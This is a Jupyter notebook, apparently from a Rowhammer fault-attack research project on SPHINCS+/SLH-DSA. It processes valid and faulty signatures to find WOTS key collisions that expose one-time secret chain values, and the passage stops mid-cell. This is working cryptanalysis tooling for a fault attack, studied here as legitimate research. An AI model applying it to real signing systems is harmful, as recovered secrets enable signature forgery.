{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "c3557aaf",
   "metadata": {},
   "source": [
    "# Config"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "0b682cbb",
   "metadata": {},
   "outputs": [],
   "source": [
    "base = \"../\"\n",
    "#base = \"../victims/sphincsplus/ref/\"\n",
    "keys_file = base + \"keys.txt\"\n",
    "sigs_file = base + \"sigs.txt\"\n",
    "sigs_simulated_file = base + \"sigs_simulated.txt\"\n",
    "\n",
    "params = 'SLH-DSA-SHAKE-256s'\n",
    "\n",
    "sanity_check = True\n",
    "simulate_faults = True\n",
    "filter_sigs  = True"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "036914a7",
   "metadata": {},
   "source": [
    "# Setup\n",
    "\n",
    "Install dependencies, define some helper functions"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "7e301996",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: numpy==1.23.4 in /home/jb/rowhammer-jb/bs-poc/.venv/lib/python3.10/site-packages (from -r requirements.txt (line 1)) (1.23.4)\n",
      "Requirement already satisfied: pycryptodome==3.16.0 in /home/jb/rowhammer-jb/bs-poc/.venv/lib/python3.10/site-packages (from -r requirements.txt (line 2)) (3.16.0)\n",
      "Requirement already satisfied: sympy==1.11.1 in /home/jb/rowhammer-jb/bs-poc/.venv/lib/python3.10/site-packages (from -r requirements.txt (line 3)) (1.11.1)\n",
      "Requirement already satisfied: mpmath>=0.19 in /home/jb/rowhammer-jb/bs-poc/.venv/lib/python3.10/site-packages (from sympy==1.11.1->-r requirements.txt (line 3)) (1.3.0)\n",
      "\n",
      "\u001b[1m[\u001b[0m\u001b[34;49mnotice\u001b[0m\u001b[1;39;49m]\u001b[0m\u001b[39;49m A new release of pip is available: \u001b[0m\u001b[31;49m25.0.1\u001b[0m\u001b[39;49m -> \u001b[0m\u001b[32;49m25.1.1\u001b[0m\n",
      "\u001b[1m[\u001b[0m\u001b[34;49mnotice\u001b[0m\u001b[1;39;49m]\u001b[0m\u001b[39;49m To update, run: \u001b[0m\u001b[32;49mpip install --upgrade pip\u001b[0m\n",
      "Note: you may need to restart the kernel to use updated packages.\n",
      "Python 3.10.12\n"
     ]
    }
   ],
   "source": [
    "%pip install -r requirements.txt\n",
    "!python --version"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "3458976f",
   "metadata": {},
   "outputs": [],
   "source": [
    "import fips205"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "6779c3fd",
   "metadata": {},
   "outputs": [],
   "source": [
    "slh = fips205.SLH_DSA(params)\n",
    "a = slh.a\n",
    "d = slh.d\n",
    "hp = slh.hp\n",
    "n = slh.n\n",
    "k = slh.k"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "917d1671",
   "metadata": {},
   "outputs": [],
   "source": [
    "def print_adrs(adrs: fips205.ADRS, end='\\n', verbose=False):\n",
    "    hex = adrs.adrs().hex()\n",
    "    if verbose:\n",
    "        print('LAYER' + ' ' * 4 + \n",
    "              'TREE ADDR' + ' ' * 18 +\n",
    "              'TYP' + ' ' * 6 +\n",
    "              'KADR' + ' ' * 5 +\n",
    "              'PADD = 0')\n",
    "    print(' '.join([hex[i:i+8] for i in range(0, len(hex), 8)]), end=' ')\n",
    "    print(end=end)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "2214aaa9",
   "metadata": {},
   "outputs": [],
   "source": [
    "def extract_wots_keys(pk: bytes, sigs: list[bytes]) -> dict[fips205.ADRS, set[fips205.WOTSKeyData]]:\n",
    "    import multiprocessing\n",
    "    from cryptanalysis_lib import process_sig\n",
    "    wots_bytes = slh.len * n\n",
    "    xmss_bytes = hp * n\n",
    "    fors_bytes = k * (n + a * n)\n",
    "    sig_len = n + fors_bytes + d * (wots_bytes + xmss_bytes)\n",
    "\n",
    "    with multiprocessing.Pool() as pool:\n",
    "        args = [(params, pk, sig_idx, sig, sig_len) for sig_idx, sig in enumerate(sigs)]\n",
    "        results = pool.map(process_sig, args)\n",
    "    \n",
    "    # Merge results\n",
    "    merged = {}\n",
    "    for item in results:\n",
    "        merged = merge_groups(merged, item)\n",
    "    return merged\n",
    "\n",
    "def merge_groups(left: dict[fips205.ADRS, set], right: dict[fips205.ADRS, set]) -> dict[fips205.ADRS, set]:\n",
    "    for key, items in right.items():\n",
    "        if key not in left:\n",
    "            left[key] = set()\n",
    "        left[key] = left[key] | items\n",
    "    return left\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "77b51cba",
   "metadata": {},
   "outputs": [],
   "source": [
    "def has_shared_intermediate(v1: fips205.WOTSKeyData, valid: fips205.WOTSKeyData) -> bool:\n",
    "    for chain_idx, chain in enumerate(v1.intermediates):\n",
    "        for step in chain:\n",
    "            if step == valid.sig[chain_idx*n:(chain_idx+1)*n]:\n",
    "                return True\n",
    "    return False\n",
    "\n",
    "def find_collisions(wots_sigs: dict[fips205.ADRS, set[fips205.WOTSKeyData]]) -> dict[fips205.ADRS, set[fips205.WOTSKeyData]]:\n",
    "    return {adrs: keys for adrs, keys in wots_sigs.items() if len(keys) > 1}\n",
    "\n",
    "def print_arr_w(arr: list[int], width=int):\n",
    "    print('[ ', end='')\n",
    "    for x in arr:\n",
    "        print(f\"{x:0{width}d}\", end=' ')\n",
    "    print(']')\n",
    "    \n",
    "def valid_sigs_d(groups):\n",
    "    return {adrs: key for adrs, keys in groups.items() for key in keys if key.valid}\n",
    "\n",
    "def find_all_shared_intermediate_offsets(v1, valid_sig):\n",
    "    if not valid_sig:\n",
    "        return None\n",
    "    results = []\n",
    "    for chain_idx, chain in enumerate(v1.intermediates):\n",
    "        for hash_iter, step in enumerate(chain[1:], start=1):\n",
    "            if step == valid_sig.sig[chain_idx*n:(chain_idx+1)*n]:\n",
    "                # find substring in valid_sig.sig starting with `step` (i.e., the application of `expose_count`+1 times to the value exposed in WOTS key)\n",
    "                offset = chain_idx*n\n",
    "                results.append((chain_idx, hash_iter, offset/n))\n",
    "    return results\n",
    "\n",
    "def hex(s: bytes | None) -> str:\n",
    "    return s.hex() if s else \"None\"\n",
    "\n",
    "def print_key_data(v: fips205.WOTSKeyData, adrs: fips205.ADRS, pk_seed: bytes, valid_key: fips205.WOTSKeyData = None):\n",
    "    print(\"Valid\" if v.valid else \"Invalid\" if v.valid == False else \"--\", end='\\t')\n",
    "    print(v.sig.hex())\n",
    "    print('\\tPK (from tree)\\t' + hex(v.pk))\n",
    "    pk = v.calculate_pk(params, adrs, pk_seed)\n",
    "    print('\\tPK (calculated)\\t' + hex(pk))\n",
    "    print(f\"\\tWOTS key is part of signature {v.sig_idx}\")\n",
    "    print('\\t\\t\\t', end='')\n",
    "    print_arr_w([i for i in range(len(v.chains))], 2)\n",
    "    print('\\t' + \"chains\\t\\t\", end='')\n",
    "    print_arr_w(v.chains, 2)\n",
    "    print('\\t' + \"chains (calc)\\t\", end = '')\n",
    "    print_arr_w(v.chains_calculated, 2)\n",
    "    if valid_key and not v.valid:\n",
    "        shared_intermediates = find_all_shared_intermediate_offsets(v, valid_key)\n",
    "        shared_intermediates = sorted(shared_intermediates, key=lambda item: item[0])\n",
    "        for chain_idx, exposed, offset in shared_intermediates:\n",
    "            assert offset == chain_idx\n",
    "            print(f\"\\t\\tExposed {exposed} secret values at chain_idx {chain_idx} offset {offset}\")\n",
    "    \n",
    "\n",
    "def print_groups(pk_seed: bytes, groups: dict[fips205.ADRS, list[fips205.WOTSKeyData]], skip_no_exposed=True):\n",
    "    #collisions: list[tuple[fips205.ADRS, set[fips205.WOTSKeyData]]] = [(adrs, value) for adrs, value in collisions if any(v.valid for v in value) and not all(v.valid for v in value)]\n",
    "    #print(f\"Found {len(collisions)} groups with at least one valid and one invalid key\")\n",
    "    # collisions where PK match. This is not necessary. Better: find exposed keys by running WOTS chain\n",
    "    \"\"\"collisions = [\n",
    "        (adrs, value)\n",
    "        for adrs, value in collisions\n",
    "        if any(v1.msg != v2.msg and v1.pk == v2.pk for v1 in value for v2 in value if v1.valid and not v2.valid)\n",
    "    ]\"\"\"\n",
    "    \n",
    "    valid_sigs = valid_sigs_d(groups)\n",
    "\n",
    "    # sort by layer address\n",
    "    groups = sorted(groups.items(), key=lambda item: item[0].get_layer_address())\n",
    "    \n",
    "    for adrs, value in groups:\n",
    "        valid_sig = valid_sigs[adrs] if adrs in valid_sigs else None\n",
    "        invalid_sigs = [v for v in value if not v.valid]\n",
    "        print_adrs(adrs, end='', verbose=True)\n",
    "        print(len(value))\n",
    "        \n",
    "        for v in [valid_sig] + invalid_sigs:\n",
    "            if not v:\n",
    "                continue\n",
    "            shared_intermediates = find_all_shared_intermediate_offsets(v, valid_sig)\n",
    "            if skip_no_exposed and valid_sig and not v.valid and not shared_intermediates:\n",
    "                continue\n",
    "            print_key_data(v, adrs, pk_seed, valid_sig)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b6cdc87e",
   "metadata": {},
   "source": [
    "# Clean Start\n",
    "\n",
    "Run this cell (and below) for a clean analysis"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "id": "184c2937",
   "metadata": {},
   "outputs": [],
   "source": [
    "processed_sigs = 0\n",
    "groups: dict[fips205.ADRS, set[fips205.WOTSKeyData]] = {}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "id": "c5267d42",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'0bc005bdb4dfb431bb250e109ca4430d42f4fd7e9270f515640701df308413952d854a500f3e893a8804ad88a600ee6812c3317e422848c5854c2b18588c1b9a'"
      ]
     },
     "execution_count": 21,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Load keys\n",
    "with open(keys_file, \"r\") as f:\n",
    "    lines = [s.split(': ') for s in f.readlines()]\n",
    "    keys = {s[0]: bytes.fromhex(s[1].strip()) for s in lines}\n",
    "sk = keys['sk']\n",
    "pk = keys['pk']\n",
    "pk_seed = pk[:n]\n",
    "pk.hex()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a8df11a2",
   "metadata": {},
   "source": [
    "# Update Experiment\n",
    "Run this cell (and below) to process new signatures"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a4b3e337",
   "metadata": {},
   "source": [
    "# Load real signatures\n",
    "\n",
    "This loads the real signatures from `sigs_file` (see config)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "9b562188",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Loaded 29065 signatures\n"
     ]
    }
   ],
   "source": [
    "with open(sigs_file, \"r\") as f:\n",
    "    sigs = [bytes.fromhex(s.strip()) for s in f.readlines()]\n",
    "    # sigs = sigs[:1000]\n",
    "print(f\"Loaded {len(sigs)} signatures\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "bc68c8f9",
   "metadata": {},
   "source": [
    "# Tooling sanity check\n",
    "\n",
    "This section tries to generate a signature using the same key and randomization values as the first signature in `sigs_file`.\n",
    "We expect them to match. This assumes that the first signature in `sigs_file` is a valid signature."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "id": "a637940c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Passed sanity check\n"
     ]
    }
   ],
   "source": [
    "if sanity_check:\n",
    "    wots_len = slh.len\n",
    "    wots_bytes = wots_len * n\n",
    "    xmss_bytes = hp * n\n",
    "    fors_bytes = k*(n + a * n)\n",
    "    sig_len = n + fors_bytes + d * (wots_bytes + xmss_bytes)\n",
    "\n",
    "    sig = sigs[0]\n",
    "\n",
    "    m = sig[sig_len:]\n",
    "    r = sig[:n]\n",
    "    pysig = slh.slh_sign_internal(m, sk, None, r=r)\n",
    "    pysig += m\n",
    "\n",
    "    if pysig != sig:\n",
    "        print(\"Signature mismatch\")\n",
    "        print(pysig.hex())\n",
    "        print(sig.hex())\n",
    "    print(\"Passed sanity check\")\n",
    "else:\n",
    "    print(\"Skipping sanity check\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a221c424",
   "metadata": {},
   "source": [
    "# Extract WOTS keys\n",
    "\n",
    "Extract all WOTS keys in all signatures"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "id": "f23d60a9",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Processing 29065 signatures... Found 198057 unique addresses\n"
     ]
    }
   ],
   "source": [
    "if processed_sigs > 0:\n",
    "    print(f\"Skipping {processed_sigs} signatures\")\n",
    "\n",
    "sigs = sigs[processed_sigs:]\n",
    "print(f\"Processing {len(sigs)} signatures...\", end=' ')\n",
    "\n",
    "groups = merge_groups(groups, extract_wots_keys(pk, sigs))\n",
    "print(f\"Found {len(groups)} unique addresses\")\n",
    "\n",
    "# update processed_sigs for consecutive runs\n",
    "processed_sigs += len(sigs)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a7ad55a2",
   "metadata": {},
   "source": [
    "# Load simulated faults\n",
    "This section loads simulated faults from `sigs_simulated_file`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9629c0cc",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Loaded 1591 faulty (simulated) signatures\n",
      "LAYER    TREE ADDR                  TYP      KADR     PADD = 0\n",
      "00000000 00000000 007535c4 59e8950d 00000001 000000af 00000000 00000000 1\n",
      "Invalid\tb85094b2f5b0dda09c9ef2fc1bd4a858a9fc8033ca1c493ad964294a1e9a90360914ea6676d8d14947c106bf78caae79bdb75c9fd5f14b4813f3a64b05e007d1f46274351b6e2e03c760c4c7e42e5cb65f04427d27fa0f0b68f42e6a886a33289cadfe0e9f50df27046ce070babd86f8004ef0a43bdfc7b1ce527cc69bd65575d1bda7f0b0fadabd7a15cc624540621851efd4c3898f2c8fbefdb9895f1e88c1cac060566001b1472ba247b3eda741228c285f0df05b156a136280de9fc282be2e0ac5c35882b9650cb65b1dd58cd18343280e0d115294087a5f6c768c3b4fe1b68149c9d4fbd1742f90342507665570978aaf55464938b93383bbad3735d2f73958574cd96ac2337ce6c8642e905fb0b68f3b4d6813c6bb2214240e15ca4251243e9ba6e3fa43d573fc0544809b1c46717cda642ab316fb0fc0b8fb91cb742c1e2115bb480ac99227ec44b41c7eee21bc3e5c41eb4d30185898d113fa21735e65671e6a0424852980c3008a86031b6925f12c0bd12ab3e21e6fb9d1542ba43b7cd26ba18d0937500dd0d3cfe9b30caa359d3569dd8b9417886b42a4394c47f218d1295c37196a9ed93f640cabfd532a7770f7de6a7602aeb27a667698908bb2e52fcc2840ace1ee1de064d80717ac768d4c52c403c03f732b7996960c38ebd8802c4755c6b0f80cdba99de5f419e1715cfc3fe3ead205a95c913db8a2219f7222734f97dea36b295941d7709a40bfc0c219204cc98a2f6854473394491072076453388b2d5f3939ae6dcf0356f8ba5bf1c98343072da78735d1618838529ea3392fe4bca06e6201b176fc56efae936cb6a840ea42e99bf5335133bfde1649d45342b8969016518f5c17192e0f3555d6af86333a4c4358d764cf938e0542aeb0f409d534d3a8352280d6e5965bab3c847e3c600b0a24b6c8106cb2354586a6c71518c3f6695ae19312905a44bd127b844d4e68e7894f2b20531427b2bf373f9e73dd4d5d41ea85fb6f16c243bbedb0971412da52bdcc68dc84f9223fd7ea884c42f1b205f9918cac5636ca311491d70fb8ee2aec03553eb8692c338abd4d3dfb12635fd5bf3ddb763da6011ed5c065470ccf96ef1123ae7ca7afbbc12a785347a46ee2c7cc4ea76f41b4183b6a47f76bb6fe805d4dd3aff9c8f58b785836a4b9b3dc258af2444e59a1ec8396f17d2c0e861ffe0ec0e23fe9d51aded502e9da7d9bcec90959306f47ef7d1e4c0faafd6f4dce5b74321c13bd9f8f6bf1475b9f6896b3e3717b85bbe8d0cc2f318238aab0a6ee2394c727d53dafb0a9a57c96bbae4b98cf51a7a55870657b41f180f20fdee2fec828bc56b54dc876dfcf7a169f0ca94319ca5eef2aca11f59a04173dab69c1c6fce708344e3a1bb96f17c80090b42c30af206314c5357b6d78764443c762a3bb41bd40cebd9271f36ef786c4c93e646f6f04d2ec6aaef47f31983d5bba70eb5d11ec988dd414c31c5892c6444fab41033c2eb0d25909ace98b0c0675f6c40003b20888f2ab6f85ec83e565b658cdd4771ec86aba7fc5e6872d9122b2f138ac95ddafff7194f8078a48aca3790235ff10c461c2529820a15946138396622580f0b32b679c9d0ad53e9e6677405e4b229f57d79c871a48de392689b7d119343a0232b435bb7f48ac19966d7905952eca9136554e6c5d4472aee92b5d43c14a48f0c64a18bea6581b490cf504d665a09c4361fda069535402c0b9af0d0e2a5cb21a0ef18bb9bb9d1d90792d17befc9b290986c3c130d4034ecef67f5f44776dc6556050bbe9d4ee459fe393d5f51112cd481f20d258837c1206a892bd927c0df6a4571bd4a44ab96038f9a88b67a651cd2ede4edd501c78eafbcd77592f69254564ca95754d069c118c38b162be603d62f846a7bb9ab8335583d0e8c1fd72438b2676c6e82bd2c314ef9642e31d5ced0093fb71029593cc08394bcb93cb0c1fe1b949fc50eaf063eab4ea4991e31f455d4ee7f1a29b9b84330cd28e41db8fc4f7abc55fd4e2ae1d9cd5612e51e65bcb1f344289be0c81cf067c2282dd9d7df4481c6d96aa6030276a3ad680a6255f4146666e498abf91ba21e0005a2e2a75895d32570c844bb65691289c650719851f4bdb1ca3687f927376afd2608dcb4a4b8987106a0b08fb5f518fd44762702ef9aaf928b436697a001cde5b8f9324ab88d663c07db41da5faef03976be27a12060c551185d798026d995af89fe6f3bdb953bce61c0a98b000586fa4d6cbb96d709bc7bfa4a7a921c992ae60199ad41c1f651be5a277e90c5af59d5d806cb8a14b1f2e861fd3432b49225af4297bb0d9c656087fc011cee58f5e834b183c3db0b8388943754727eccf26307ff56f0e156c7cfd85d5b589be32c706f37bc683b795ddc3542eede8c7942315f6586b20c31a8b0d2a42431bea6dc19921190c8885042e8cd266ac48a67db9f7ebc3c22d02c19e8dc48f40b0fe1c06e861e1443d5aa2aa34fd6dc3535004a1d534d65482c35d032a1ac9750bedbc80796a73188cf9e4e1ebc42d2c7d6ca3dec3d4c81a33bc4377a753a374e5b65edecdbfdc9ea0d81750059433f74f524c3051e3880df0ce53144ad3a4abd103cb2a00a51b861ba4733502b0741cec8005ec1266a23e9996bb91d460f4725a4045836b91f248bc7597a6ab91a4343e75182cfa7e4f70c330b6749edd6a87c0ef20bb1abf3311af45485c110fa34df83813fd5edab3f69c9b3fcd8bbd2d6f8e09732b86f3a2d107966d7eb706a871401fe5a8207b39965c27d232403b95ba79af3ddf39755239a6d13db8acf0c0d5f8e835dee0f75c2f5d670bf262f6e272de6b404ac922236443b8baa9e6ba9f8300895560c118a51d7c008ff6fc63d6349e06dc9e2fe3d1e385041f54d20aecc631432cf985ec4393b5dd2ca62151cc83bd13b82a037763a91fb064d956a3808bdd7515ef94c0c552b238d0643d6564b3001ca2c21aa78afc9b436c00f8893d9afd31595bcd5cc327bd384babe0906b548e6fb586aab6af2120d2c4\n",
      "\tPK (from tree)\t50659dd0d70fd454bc559deb4eca67eccbac5745c006a88e893f7d79e633244b\n",
      "\tPK (calculated)\tNone\n",
      "\tWOTS key is part of signature 0\n",
      "\t\t\t[ 00 01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 ]\n",
      "\tchains\t\t[ 00 12 01 00 02 15 04 15 03 09 07 07 07 10 05 03 08 11 14 10 04 08 03 10 11 03 12 14 10 04 02 04 07 03 04 01 11 12 15 01 14 13 08 08 09 09 03 04 01 03 14 06 01 06 03 10 02 13 15 01 00 13 15 12 01 14 15 ]\n",
      "\tchains (calc)\t[ "
     ]
    },
    {
     "ename": "TypeError",
     "evalue": "'NoneType' object is not iterable",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mTypeError\u001b[0m                                 Traceback (most recent call last)",
      "Cell \u001b[0;32mIn[13], line 7\u001b[0m\n\u001b[1;32m      5\u001b[0m     \u001b[38;5;28mprint\u001b[39m(\u001b[38;5;124mf\u001b[39m\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mLoaded \u001b[39m\u001b[38;5;132;01m{\u001b[39;00m\u001b[38;5;28mlen\u001b[39m(faulty_sigs)\u001b[38;5;132;01m}\u001b[39;00m\u001b[38;5;124m faulty (simulated) signatures\u001b[39m\u001b[38;5;124m\"\u001b[39m)\n\u001b[1;32m      6\u001b[0m     simulated_groups \u001b[38;5;241m=\u001b[39m extract_wots_keys(pk, faulty_sigs)\n\u001b[0;32m----> 7\u001b[0m     \u001b[43mprint_groups\u001b[49m\u001b[43m(\u001b[49m\u001b[43mpk_seed\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43msimulated_groups\u001b[49m\u001b[43m)\u001b[49m\n\u001b[1;32m      8\u001b[0m     groups \u001b[38;5;241m=\u001b[39m merge_groups(groups, simulated_groups)\n\u001b[1;32m      9\u001b[0m \u001b[38;5;28;01melse\u001b[39;00m:\n",
      "Cell \u001b[0;32mIn[7], line 83\u001b[0m, in \u001b[0;36mprint_groups\u001b[0;34m(pk_seed, groups, skip_no_exposed)\u001b[0m\n\u001b[1;32m     81\u001b[0m \u001b[38;5;28;01mif\u001b[39;00m skip_no_exposed \u001b[38;5;129;01mand\u001b[39;00m valid_sig \u001b[38;5;129;01mand\u001b[39;00m \u001b[38;5;129;01mnot\u001b[39;00m v\u001b[38;5;241m.\u001b[39mvalid \u001b[38;5;129;01mand\u001b[39;00m \u001b[38;5;129;01mnot\u001b[39;00m shared_intermediates:\n\u001b[1;32m     82\u001b[0m     \u001b[38;5;28;01mcontinue\u001b[39;00m\n\u001b[0;32m---> 83\u001b[0m \u001b[43mprint_key_data\u001b[49m\u001b[43m(\u001b[49m\u001b[43mv\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43madrs\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mpk_seed\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mvalid_sig\u001b[49m\u001b[43m)\u001b[49m\n",
      "Cell \u001b[0;32mIn[7], line 47\u001b[0m, in \u001b[0;36mprint_key_data\u001b[0;34m(v, adrs, pk_seed, valid_key)\u001b[0m\n\u001b[1;32m     45\u001b[0m print_arr_w(v\u001b[38;5;241m.\u001b[39mchains, \u001b[38;5;241m2\u001b[39m)\n\u001b[1;32m     46\u001b[0m \u001b[38;5;28mprint\u001b[39m(\u001b[38;5;124m'\u001b[39m\u001b[38;5;130;01m\\t\u001b[39;00m\u001b[38;5;124m'\u001b[39m \u001b[38;5;241m+\u001b[39m \u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mchains (calc)\u001b[39m\u001b[38;5;130;01m\\t\u001b[39;00m\u001b[38;5;124m\"\u001b[39m, end \u001b[38;5;241m=\u001b[39m \u001b[38;5;124m'\u001b[39m\u001b[38;5;124m'\u001b[39m)\n\u001b[0;32m---> 47\u001b[0m \u001b[43mprint_arr_w\u001b[49m\u001b[43m(\u001b[49m\u001b[43mv\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mchains_calculated\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[38;5;241;43m2\u001b[39;49m\u001b[43m)\u001b[49m\n\u001b[1;32m     48\u001b[0m \u001b[38;5;28;01mif\u001b[39;00m valid_key \u001b[38;5;129;01mand\u001b[39;00m \u001b[38;5;129;01mnot\u001b[39;00m v\u001b[38;5;241m.\u001b[39mvalid:\n\u001b[1;32m     49\u001b[0m     shared_intermediates \u001b[38;5;241m=\u001b[39m find_all_shared_intermediate_offsets(v, valid_key)\n",
      "Cell \u001b[0;32mIn[7], line 13\u001b[0m, in \u001b[0;36mprint_arr_w\u001b[0;34m(arr, width)\u001b[0m\n\u001b[1;32m     11\u001b[0m \u001b[38;5;28;01mdef\u001b[39;00m\u001b[38;5;250m \u001b[39m\u001b[38;5;21mprint_arr_w\u001b[39m(arr: \u001b[38;5;28mlist\u001b[39m[\u001b[38;5;28mint\u001b[39m], width\u001b[38;5;241m=\u001b[39m\u001b[38;5;28mint\u001b[39m):\n\u001b[1;32m     12\u001b[0m     \u001b[38;5;28mprint\u001b[39m(\u001b[38;5;124m'\u001b[39m\u001b[38;5;124m[ \u001b[39m\u001b[38;5;124m'\u001b[39m, end\u001b[38;5;241m=\u001b[39m\u001b[38;5;124m'\u001b[39m\u001b[38;5;124m'\u001b[39m)\n\u001b[0;32m---> 13\u001b[0m     \u001b[38;5;28;01mfor\u001b[39;00m x \u001b[38;5;129;01min\u001b[39;00m arr:\n\u001b[1;32m     14\u001b[0m         \u001b[38;5;28mprint\u001b[39m(\u001b[38;5;124mf\u001b[39m\u001b[38;5;124m\"\u001b[39m\u001b[38;5;132;01m{\u001b[39;00mx\u001b[38;5;132;01m:\u001b[39;00m\u001b[38;5;124m0\u001b[39m\u001b[38;5;132;01m{\u001b[39;00mwidth\u001b[38;5;132;01m}\u001b[39;00m\u001b[38;5;124md\u001b[39m\u001b[38;5;132;01m}\u001b[39;00m\u001b[38;5;124m\"\u001b[39m, end\u001b[38;5;241m=\u001b[39m\u001b[38;5;124m'\u001b[39m\u001b[38;5;124m \u001b[39m\u001b[38;5;124m'\u001b[39m)\n\u001b[1;32m     15\u001b[0m     \u001b[38;5;28mprint\u001b[39m(\u001b[38;5;124m'\u001b[39m\u001b[38;5;124m]\u001b[39m\u001b[38;5;124m'\u001b[39m)\n",
      "\u001b[0;31mTypeError\u001b[0m: 'NoneType' object is not iterable"
     ]
    }
   ],
   "source": [
    "import os\n",
    "if simulate_faults and os.path.exists(sigs_simulated_file):\n",
    "    with open(sigs_simulated_file, \"r\") as f:\n",
    "        faulty_sigs = [bytes.fromhex(s.strip()) for s in f.readlines()]\n",
    "    print(f\"Loaded {len(faulty_sigs)} faulty (simulated) signatures\")\n",
    "    simulated_groups = extract_wots_keys(pk, faulty_sigs)\n",
    "    for adrs, keys in simulated_groups.items():\n",
    "        for key in keys:\n",
    "            key.simulated = True\n",
    "    print_groups(pk_seed, simulated_groups)\n",
    "    groups = merge_groups(groups, simulated_groups)\n",
    "else:\n",
    "    print(\"Fault simulation disabled or no simulated faulty signatures found\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6c08d3f2",
   "metadata": {},
   "source": [
    "# Results\n",
    "\n",
    "...appear here!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "80ed30d4",
   "metadata": {},
   "outputs": [],
   "source": [
    "for adrs, keys in groups.items():\n",
    "    if len([v for v in keys if v.valid]) > 1:\n",
    "        print(\"ERROR: found multiple valid keys for the same address\", adrs, keys)\n",
    "        raise ValueError(\"Multiple valid keys for the same address\")\n",
    "\n",
    "\n",
    "# maintain a dictionary of valid signatures per adrs\n",
    "valid_sigs = valid_sigs_d(groups)\n",
    "\n",
    "# only keep keys where we also observered valid signatures\n",
    "groups = {adrs: sigs for adrs, sigs in groups.items() if adrs in valid_sigs}\n",
    "print(f\"Found {len(groups)} groups with valid signatures\")\n",
    "\n",
    "groups = find_collisions(groups)\n",
    "print(f\"Found {len(groups)} groups with collisions\")\n",
    "\n",
    "# post-process collided WOTS keys\n",
    "for adrs, keys in groups.items():\n",
    "    if adrs not in valid_sigs:\n",
    "        continue\n",
    "    valid_sig = valid_sigs[adrs]\n",
    "    valid_sig.calculate_intermediates(params, adrs, pk_seed, valid_sig)\n",
    "    for key in keys:\n",
    "        key.calculate_intermediates(params, adrs, pk_seed, valid_sig)\n",
    "\n",
    "print_groups(pk_seed, groups, skip_no_exposed=False)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "120a2bcd",
   "metadata": {},
   "outputs": [],
   "source": [
    "# filter groups with exposed WOTS secrets\n",
    "groups = {adrs: sigs \n",
    "    for adrs, sigs in groups.items()\n",
    "    if any(not sig.valid and has_shared_intermediate(sig, valid_sigs[adrs]) for sig in sigs)\n",
    "}\n",
    "print(f\"Found {len(groups)} groups with exposed WOTS secrets\")\n",
    "print_groups(pk_seed, groups)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "61b57808",
   "metadata": {},
   "outputs": [],
   "source": [
    "def filter_signatures(sigs: list[bytes], wots_keys: dict[fips205.ADRS, set[fips205.WOTSKeyData]]) -> set[bytes]:\n",
    "    filtered_sigs = set()\n",
    "    collisions = find_collisions(wots_keys)\n",
    "    print(f\"Found {len(collisions)} groups with collisions\")\n",
    "    collisions = {adrs: sigs for adrs, sigs in collisions.items() if any(sig.valid for sig in sigs) and not all(sig.valid for sig in sigs)}\n",
    "    valid_sigs = valid_sigs_d(wots_keys)\n",
    "    for adrs, keys in collisions.items():\n",
    "        for key in keys:\n",
    "            if key.valid:\n",
    "                # keep valid keys\n",
    "                filtered_sigs.add(sigs[key.sig_idx])\n",
    "            if adrs in valid_sigs and has_shared_intermediate(key, valid_sigs[adrs]):\n",
    "                filtered_sigs.add(sigs[key.sig_idx])\n",
    "    return filtered_sigs\n",
    "\n",
    "if filter_sigs:\n",
    "    # only keep signatures that are valid or have exposed WOTS keys\n",
    "    filtered_sigs = filter_signatures(sigs, groups)\n",
    "    print(f\"Kept {len(filtered_sigs)} of {len(sigs)} signatures\")\n",
